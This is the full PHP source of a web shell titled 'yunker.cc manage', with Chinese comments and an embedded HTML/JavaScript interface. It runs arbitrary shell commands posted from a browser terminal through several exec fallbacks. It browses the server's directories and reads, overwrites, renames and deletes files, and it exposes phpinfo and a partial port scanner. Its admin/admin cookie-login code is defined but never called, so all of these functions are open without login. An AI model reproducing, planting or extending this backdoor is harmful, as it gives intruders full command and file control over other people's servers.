
<?php
 //获得系统信息
// header("Content-Type: text/html;charset=gbk2312");
class cookieser
{
  function __construct()
  {
   $this->user = md5("admin");//用户名
   $this->passwords = md5("admin");//密码
  }
    function setcookies()
    {
      $name = md5(@$_POST['name']);
      $password = md5(@$_POST['password']);
      if($name == $this->user && $password == $this->passwords)
      {
        setcookie("name",$name,time()+3600);
        setcookie("passwords",$password,time()+3600);
        return true;
      }
      else
      {
        return false;
      }

    }

    function getcookie()
    {
        $namecookie=@$_COOKIE['name'];
        $passcookie = @$_COOKIE['pass'];
        if($namecookie == $this->user && $passcookie == $this->passwords)
        {
          return true;
        }
        else
        {
          return false;
        }
    }
}



  class system 
  {

  	function get_info()
  	{
  		$this->system_info=php_uname();
  		$this->apache_php_info  = $_SERVER['SERVER_SOFTWARE'];
  		#$this->mysql_info = 
  		$this->realpath = $_SERVER['SCRIPT_FILENAME'];
  		$this->time = date('Y-m-d h:i:sa');
  		$systeminfo=array($this->system_info,$this->apache_php_info,$this->realpath,$this->time);
  		return $systeminfo;
  	}
  	function disk_info()
  	{
  		if (is_callable("disk_total_space")) {
  			foreach (range("a", "l") as $letter) {
  				if(@disk_total_space($letter.":")>0)
  				{
  					$this->all_size = round(disk_total_space($letter.":")/(1024*1024*1024),2);

  					$this->free_size = round(disk_free_space($letter.":")/(1024*1024*1024),2);
  					$this->percent  = round(100/($this->all_size/$this->free_size),2);
  					$disk_size[$letter] = array($this->all_size,$this->free_size,$this->percent);
  				}
  			}
  		}
  		return $disk_size;
  	}

  }
  $systeminfo=new system;
  $system_info =$systeminfo->get_info();
  $disk_size=$systeminfo->disk_info();
  $string="";
  foreach ($disk_size as $key => $value) {
  	# code...
  	$string .= "<tr><td>"."<a href=?path=$key:&act=ls>".$key."</a>"."</td>"."<td>".$value[0]."G"."</td>"."<td>".$value[1]."G"."</td>"."<td>".$value[2]."%"."</td></tr>";

  }
  //功能类，实现功能
  class file
  {
  	function filename($path)
  	{
  		$files = array();
  		stripslashes($path);
  		if ($handle = opendir($path)) {
  			while(($file = readdir($handle))!==false)
  			{
  				$fileinfo = $this->fileperms($path."/".$file);
  				$filetime = date("Y-d-m H:i:s.",@filectime($path."/".$file));
  				if (is_dir($path."/".$file)) {
  					
  					// $file = iconv('GB2312','UTF-8',$file);
  					$files[$file]=array(urlencode($path."/".$file)."&act=ls",$fileinfo,"目录",$filetime,"--","重命名","","删除");
  				}
  				else
  				{
            // $file = iconv('GB2312','UTF-8',$file);
  					$filesize = round(@filesize($path."/".$file)/1024,2);
  					$files[$file]=array(urlencode($path."/".$file)."&act=read",$fileinfo,"文件",$filetime,$filesize,"重命名","修改","删除");
  				}
  			}
  		}
  		return $files;
  	}

  	function fileperms($path)
  	{
  		$perms = @fileperms($path);
  		if(($perms & 0xC000) == 0xC000)
  		{
  			$info  ='s';
  		}
  		elseif (($perms & 0xA000) == 0xA000) {
  			$info = 'l';
  		}
  		elseif (($perms & 0x8000) == 0x8000) {
  			$info  = '-';
  		}
  		elseif (($perms & 0x6000 ) == 0x6000) {
  			$info = 'b';
  		}
  		elseif (($perms & 0x4000) ==0x4000) {
  			$info = 'd';
  		}
  		elseif (($perms & 0x2000) ==0x2000) {
  			$info = 'c';
  		}elseif (($perms & 0x1000) ==0x1000) {
  			$info = 'p';
  		}
  		else
  		{
  			$info = 'u';
  		}
  		// Owner
		$info .= (($perms & 0x0100) ? 'r' : '-');
		$info .= (($perms & 0x0080) ? 'w' : '-');
		$info .= (($perms & 0x0040) ?
		            (($perms & 0x0800) ? 's' : 'x' ) :
		            (($perms & 0x0800) ? 'S' : '-'));
  		// Group
		$info .= (($perms & 0x0020) ? 'r' : '-');
		$info .= (($perms & 0x0010) ? 'w' : '-');
		$info .= (($perms & 0x0008) ?
		            (($perms & 0x0400) ? 's' : 'x' ) :
		            (($perms & 0x0400) ? 'S' : '-'));
				// World
		$info .= (($perms & 0x0004) ? 'r' : '-');
		$info .= (($perms & 0x0002) ? 'w' : '-');
		$info .= (($perms & 0x0001) ?
		            (($perms & 0x0200) ? 't' : 'x' ) :
		            (($perms & 0x0200) ? 'T' : '-'));
  		return $info;
  	}



  	function systemcmd($cmd)
  	{
  		$result="";
  		$resultstring="";
  		if(!empty($cmd))
  		{
  			if (is_callable("exec"))
  			{
  				exec($cmd,$result);
  			}
  			elseif(is_callable("shell_exec"))
  			{
  				$result=shell_exec($cmd);
  			}
  			elseif(is_callable("system"))
  			{
  				@ob_start();syetem($cmd);$result = @ob_get_contents();@ob_end_clean();
  			}
  			elseif(is_callable("passthru"))
  			{
  				@ob_start(); passthru($cmd); $result = @ob_get_contents();@ob_end_clean();
  			}
  			elseif(($result = '$cmd') !== false){}
  			elseif(is_resource($fp = popen($cmd,"r")))
  			{
  				$result  = "";
  				while(!feof($fp))
  				{
  					$result.=fread($fp,1024);
  				}
  			}  
  		}

  		if(!empty($result))
  		{
  			foreach ($result as $key => $value) {
  				$resultstring.=$value."<br>";
  			}
        $resultstring = iconv('GB2312','UTF-8',$resultstring);
  			return $resultstring;
  		}
  		else
  		{
  			return "不存在这个命令";
  		}

  	}
    
    function scanports($port)//扫描端口
    {
        $ip = "127.0.0.1";
        // if(is_callable(fsockopen))
        // {
        //   $fp=fsockopen($ip,$port,&$errno,&$errstr,1)
        //   if(!$fp)
        //   {
        //     return false;
        //   }
        //   else
        //   {
        //     return true;
        //   }
        // }


    }

  }
  #文件信息，phpinfo
  class getinfo extends file
  {
  	function php_info()
  	{
  		phpinfo();
  	}
  	#获取url值
  	function get()
  	{
  		$this->urlid = @$_GET['id'];
  		if ($this->urlid == "phpinfo")
  		{
  			$this->php_info();
  		}

  		//获取url的值
  		$this->urlpath  = @$_GET['path'];
  		$this->urlact = @$_GET['act'];
  		$this->urlaction = @$_GET['action'];
  		if ($this->urlpath == "") {
  			$path_info = pathinfo($_SERVER['SCRIPT_FILENAME']);
  			$this->files_info = parent::filename($path_info['dirname']);
  			$this->path_current = $path_info['dirname'];
  			return $this->outputhtml($this->files_info,$this->path_current);
  			
  		}
  		elseif($this->urlact == "ls" & $this->urlaction == "")
  		{
  			$this->files_info = parent::filename($this->urlpath);
  			$this->path_current = $this->urlpath;
  			return $this->outputhtml($this->files_info,$this->path_current);

  		}
  		elseif($this->urlact=="read" & $this->urlaction == "" )
  		{
  			echo '<script type="text/javascript">alert("这是文件，还不到能打开")
					</script>';
  		}
  		elseif($this->urlact == "ls" & $this->urlaction == "rename")
  		{
  			echo "directory rename";
  		}
  		elseif($this->urlact == "ls" & $this->urlaction == "delete")
  		{
  			echo "delete dictory";
  		}
  		elseif($this->urlact == "read" & $this->urlaction == "rename")
  		{
  			echo "file rename";
  		}
  		elseif($this->urlact == "read" & $this->urlaction == "change")
  		{
  			echo "file change";
  		}
  		elseif($this->urlact == "read" & $this->urlaction == "delete")
  		{
  			echo "file dlete";
  		}
  		//获取post值，mysql和cmd
  		
  }
  function outputhtml($files_info,$path_current){
  		$string="";
  		 foreach ($files_info as $key => $value) {
  		$string .= "<tr><td>"."<a href=?path=$value[0]>".$key."</a>"."</td>"."<td>".$value[2]."</td>"."<td>".$value[4]."KB"."</td>"."<td>".$value[3]."</td>"."<td>".$value[1]."</td>"."<td>"."<a href='#' onclick=rename('$value[0]','rename')>".$value[5]."&nbsp;&nbsp;"."</a>"."<a href='#' onclick=changefile('$value[0]','change')>".$value[6]."&nbsp;&nbsp;</a>"."<a href=# onclick=deletefile('$value[0]','delete')>".$value[7]."&nbsp;&nbsp;</a>"."</td></tr>";}
  		return array($string,$path_current);
  	}

  	function post()
  		{
  			$result="";//命令返回的结果
  			$systemcmd = @$_POST['cmd'];//输入的命令
  			$action = @$_POST['action'];//用户的动作
  			$path = @$_POST['path'];//文件的路径
  			$act = @$_POST['act'];//命令的参数，判断是文件还是文件夹
  			$newname= @$_POST['newname'];//命名的新的名称
        $content  =@$_POST['content'];//获取content的值
        $ports = @$_POST['ports'];//获取端口
  			if($action =="systemcmd")
  			{
  			$result=parent::systemcmd($systemcmd);
  			echo $result;
  			}

  			elseif($action == "rename")
  			{
  				if($act == "ls" || $act=="read")
  				{
  					$path_array = explode('/',$path);
  					//判断是不是上上级目录或者当前目录
  					$path_array_lis= $path_array[count($path_array)-1];
  					if ($path_array_lis != "." && $path_array_lis != "..")
  					{
  						if(!empty($newname)){
  						if(rename($path,pathinfo($path)['dirname']."/".$newname))
  						{
  							echo "修改成功";
  						}
  						else
  						{
  							echo "权限不够";
  						}
  					}
  					else
  					{
  						echo "名称不能为空";
  					}
  					}
  					else
  					{
  						echo "当前目录或上级目录不能改名";
  					}
  				}
  			}
  			elseif($action=="delete")
  			{
          if($act == "ls")
          {
  				if(unlink($path))
  				{
  					echo "文件删除成功";
  				}
  				else
  				{
  					echo "权限不够";
  				}
        }
        else
        {
          if(rmdir($path))
          {
            echo "目录删除成功";
          }
          else
          {
            echo "权限不够或者是空目录";
          }
        }
  			}

        elseif($action == "change" && $act == "read")
        {
          $filecontent=file_get_contents($path);
          echo $filecontent;
        }
        elseif($action == "filechange" && $act == "read")
        {

          if(file_put_contents($path,urldecode($content)))
          {
            echo "保存成功";
          }
          else
          {
            echo "权限不足或者未知错误";
          }
        }
        else if($action == "someports")
        {
          if($ports != "all")
          {
            $port = explode(',',$ports);
            foreach ($port as $key) {
              echo $key;
            }

          }
        }
  			
  		}

}
  $getinfo=new getinfo;
  $files_info=$getinfo->get();
  $files_info[1]=iconv('gb2312','utf-8',$files_info[1]);
  $cmd_result = $getinfo->post();
  $html=<<<html
  <html>yunker.cc
	<head>
		<title>yunker.cc manage</title>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	</head>
	<style type="text/css">
		html,body,div,dl,dt,dd,ul,ol,li,h1,h2,h3,h4,h5,h6,pre,form,fieldset,input,textarea,p,blockquote,th,td {
		    margin: 0;
		    padding: 0;
		    font-family: 'Comic Sans MS', cursive,'幼圆';
		}
		#bigtitle
		{
			text-align:center;
			height:80px;
			line-height:80px;

		}
		#title{
			font-size: 36px;
			border-radius: 0 0 44px 44px;
		}
		#systeminfo
		{
			margin-top: 30px;
			position: relative;
		}
		
		#disk
		{
			width:1349px;
			position: relative;
			margin-top: 10px;
		}
		#disk ul li
		{
			width: 300px;
			text-align: center;
			margin-left: 30px;
			float: left;
		}
		.tablelist ul
		{
			list-style: none;
			
		}
		.tablelist ul li
		{
			width: auto;
			margin-left: 30px;
			float: left;
		}
		.tablelist ul li a
		{
			text-decoration: none;
			color: black;
			text-decoration: underline;
		}
		#disk  a 
		{
			text-decoration: none;
			color: black;
			text-decoration: underline;
		}
		#file{
		position:relative;

		width: 1349px;
	}
				#file table{

		width: 1349px;
	}
		.tablelist table thead td
		{
			text-align: center;
		}
		.tablelist table tbody tr td
		{
			text-align: center;
		}
		.tablelist a
		{
				text-decoration: none;
				color:black;
				text-decoration: underline;
		}
		#disk_info tr

		{
			margin-left:10px;
		}
		#cmd{
			top: 60px;
			left: 500px;
			position: absolute;
			height: 132px;
			width: 700px;
			border: 1px solid black;
			overflow: scroll;
		}
		#cmd p
		{
			display: inline-block;

		}
		#cmdcontent input
		{
			width: 360px;
			background-color: rgba(0,0,0,0);
			border: none;
			font-size: 20px;
			outline:none;
		}
    #textarea
        {
          position:fixed;
          width: 800px;
          height: 600px;
          background-color: rgba(23, 7, 7, 0.57);
          left: 20%;
          top:-600px;
          z-index: 200;
          text-align: center;
        }
       #filecontent
       {
        background-color: rgba(23, 7, 7, 0);
        color:white;
        width: 790px;
        height: 560px;
        outline: none;
        border:0;
       }
        #textarea a
       {
        text-decoration: none;
        color:white;
       }
        #scanports
       {
        width: 300px;
        height:600px;
        background-color: rgba(0,0,0,0.7);
        text-align: center;
        top:-600px;
        position:fixed;
        z-index: 400;
       }

       #scanports a
       {
        text-decoration: none;
        color:white;
       }
        #scanports textarea
        {
             width:280px;
            height:200px;
            color:white;
            background-color: rgba(0,0,0,0);
            

        }
	</style>
	<body>
      <div id="scanports">
           <textarea name="someports" id="ports">20,21,80,81,82,445,3389,8080</textarea>
           <br/>
           <a href="#" id="someports" onclick="someports()">特定端口扫描</a>
           <a href="#" id="allports" onclick="allports()">所有端口扫描</a>
           <a href="#" id="allports" onclick="byeports()">byebye!</a>
       </div>
      <div id="textarea">
      <textarea name="filecontent" id="filecontent">

      </textarea>
      <a href="#" id="filechange">修改</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#" onclick="giveup()">放弃</a>
   </div>
		<div id="bigtitle"><div id="title">YUNKER.CC MANAGE</div></div>
		<div id="disk" calss="tablelist">
		<table>
				<tbody id="disk_info">
					<tr>{$system_info[0]}&nbsp;&nbsp;&nbsp;</tr>
					<tr>mysql信息&nbsp;&nbsp;&nbsp;</tr>
					<tr>{$system_info[3]}&nbsp;&nbsp;&nbsp;</tr>
					<tr>{$system_info[1]}&nbsp;&nbsp;&nbsp;</tr>
					<tr>{$system_info[2]}&nbsp;&nbsp;&nbsp;</tr>
					<tr><a href="?id=phpinfo">phpinfo</a>&nbsp;&nbsp;&nbsp;</tr>
          <tr><a href="#" onclick="scanportsframe()">端口扫描</a>&nbsp;&nbsp;&nbsp;</tr>
				</tbody>
			</table>
		<table>
				<thead>
					<tr>
						<td>
						磁盘信息
						</td>
					</tr>
				</thead>
				<tbody>
					<tr>
						<td>磁盘</td>
						<td>大小</td>
						<td>剩余</td>
						<td>剩余%</td>
					</tr>
					{$string}
				</tbody>
			</table>
			<div id="cmd">
				<p>cmd></p>
				<a id="big" href="#" onclick="bigger()">放大</a>&nbsp;&nbsp;&nbsp;&nbsp;<a id="small" href="#" onclick="smaller()">缩小</a>
				<div id="cmdcontent">
				<br><p style="color:red">{$files_info[1]}></p>
				<input type="text" name="inputcmd" id="inputname" onkeypress="submitcmd(event)">
				</div>
			</div>
		<div id="file" class="tablelist">
			<table>
				<thead>
					<tr>
						<th>当前路径:{$files_info[1]}</th>
					</tr>
				</thead>
				<tbody>
					<tr>
						<td>文件名</td>
						<td>文件类型</td>
						<td>大小</td>
						<td>修改日期</td>
						<td>文件权限</td>
						<td>操作</td>
					</tr>
					{$files_info[0]}
				</tbody>
			</table>
		</div>
	</body>
		<script type="text/javascript">
		//这个是系统cmd的函数
		function submitcmd(event)
		{
			var key;//获取回车的键值
			var objectcmd;
			var cmd;
			if(window.event)
			{
				key = event.keyCode;
			}
			else if(event.which)
			{
				key = event.which;
			}
			
			if(key == 13)
			{
				objectcmd=document.getElementsByName("inputcmd");
				cmd=objectcmd[objectcmd.length-1].value;
				sendcmd(cmd,"systemcmd");
			}
		}

		function createlement(result)
		{
			//返回的结果
			var divframe = document.getElementById('cmdcontent');
			var p = document.createElement('p');
			p.setAttribute("style","color:rgb(41, 16, 255)");
			p.innerHTML=result;
			divframe.appendChild(p);
			
			//箭头，换行

			var br = document.createElement('br');
			divframe.appendChild(br);
			var narrow = document.createElement('p');
			narrow.innerHTML='<p style="color:red">{$files_info[1]}></p>';
			divframe.appendChild(narrow);

			
			//一个新的输入命令行
			var input = document.createElement('input');
			input.setAttribute("name","inputcmd");
			input.setAttribute("type","text");
			input.setAttribute("onkeypress","submitcmd(event)");
			divframe.appendChild(input).focus();

		}

		function bigger()
		{
			document.getElementById("cmd").style.cssText="width:750px;height:600px;z-index:999;background-color:rgba(74, 48, 56, 0.93);left:354px;color:white";
			document.getElementById("inputcmd").style.cssText="color:white";
		}
		function smaller()
		{
			document.getElementById("cmd").style.cssText="width:700px;height:132px";
		}

		function sendcmd(cmd,action)
		{
			//提取cmd的结果
			var urlarray=document.URL;
			if(urlarray.indexOf("?")>=0)
			{
			var url = urlarray.split("?");
			}
			else
			{
				url = urlarray.split("#");
			}
			ajax(url[0],cmd,action);
		}

	function ajax(url,cmd,action){
    //1.创建对象
    var oAjax = null;
    if(window.XMLHttpRequest){
        oAjax = new XMLHttpRequest();
    }else{
        oAjax = new ActiveXObject("Microsoft.XMLHTTP");
    }
        
    //2.连接服务器  
    oAjax.open('post', url, true);   //open(方法, url, 是否异步)
      
    //3.发送请求 
    oAjax.setRequestHeader("Content-type","application/x-www-form-urlencoded");
        //判断发送的请求给谁
    if(action == "systemcmd")
    {
    oAjax.send("cmd="+cmd+"&action="+action);
    }
    // else if(action=="change")
    // {
    //     oAjax.send("path="+cmd+"&action="+action);
    // }
    // else if(action == "filechange")
    // {
    //     oAjax.send("path="+cmd+"&action="+action);
    // }
    else if(action == "someports")
    {
      oAjax.send("ports="+cmd+"&action="+action);
    }
      else
    {
        oAjax.send("path="+cmd+"&action="+action);
    }
      
    //4.接收返回
	oAjax.onreadystatechange = function(){  //OnReadyStateChange事件
        if(oAjax.readyState == 4){  //4为完成
            if(oAjax.status == 200){    //200为成功
                var responseText=oAjax.responseText;
                if(action == "systemcmd")
                {
                createlement(responseText.split("<html>yunker.cc")[0]);
                }
                else if(action == "change")
                {
                  document.getElementById("filecontent").value=responseText.split("<html>yunker.cc")[0];
                }
                else if(action == "someports")
                {
                  var divframe = document.getElementById('scanports');
                  var p = document.createElement('p');
                  p.setAttribute("style","color:rgb(41, 16, 255)");
                  p.innerHTML=responseText.split("<html>yunker.cc")[0];
                  divframe.appendChild(p);
                }
                else
                {
                	alert(responseText.split("<html>yunker.cc")[0]);
                }
            }else{

                    alert('无法找到主机');
            }
        }
    }
	}
	    function rename(path,action)
    {
    	var filename=path.split('%2F');
    	var newname=prompt("新的名称,注意加后缀！！",filename[filename.length-1].split("&")[0]);
    	if(newname == "" & newname != filename[filename.length-1].split("&")[0])
    	{
    		alert("名称不能为空");
    	}
    	else{
    	path=path+"&newname="+newname;
        sendcmd(path,action);
   	 	}
    }
        function deletefile(path,action)
    {
    	var filename=path.split('%2F');
    	var r=confirm("确定要删除"+filename[filename.length-1].split("&")[0]);
    	if(r==true)
    	{
    	sendcmd(path,action);
    	}

    }
     function changefile(path,action)//修改前的数据
    {
      document.getElementById("textarea").style.cssText="top:10px";
      var textarea=document.getElementById("filechange");
      var fchange_funn = "filechange('"+path+"','filechange')";//函数修改后的
      textarea.setAttribute("onclick",fchange_funn);
      sendcmd(path,action);
    }
        function filechange(path,action)//修改后的数据
    {
        var content = document.getElementById("filecontent").value;
        content=URLencode(content);
        path=path+"&content="+content;
        sendcmd(path,action)
    }
    //取消修改
    function giveup()
    {
      document.getElementById("textarea").style.cssText="top:-600px";
      document.getElementById("filecontent").value="";
    }

    //url编码

       function URLencode(clearstring)
    {
      var output='';
      var x=0;
      clearstring=clearstring.toString();
      var regex = /(^[a-zA-Z0-9-_.]*)/;
      while (x<clearstring.length)
      {
        var match = regex.exec(clearstring.substr(x));
        if (match!=null && match.length>1 && match[1]!='')
        {
          output +=match[1];
          x+=match[1].length;
        }
        else
        {
          if(clearstring.substr(x,1) == '')
          {
            output +='+';
          }
          else
          {
            var charcode = clearstring.charCodeAt(x);
            var hexval = charcode.toString(16);
            output +='%'+(hexval.length<2?'0':'')+hexval.toUpperCase();
          }
          x++;
        }
      }
      return output;
    }


    function scanportsframe()
    {
      document.getElementById("scanports").style.cssText="top:0px";
    }
    function someports()//特定的端口扫描
    {
      var ports  = document.getElementById('ports').value;
      ports = URLencode(ports);
      sendcmd(ports,"someports");
    }
    function allports()//所有的端口扫描
    {
      alert("all ports");
    }
    function byeports()
    {
      document.getElementById("scanports").style.cssText="top:-600px";
    }
	</script>
</html>
html;
echo $html;
?>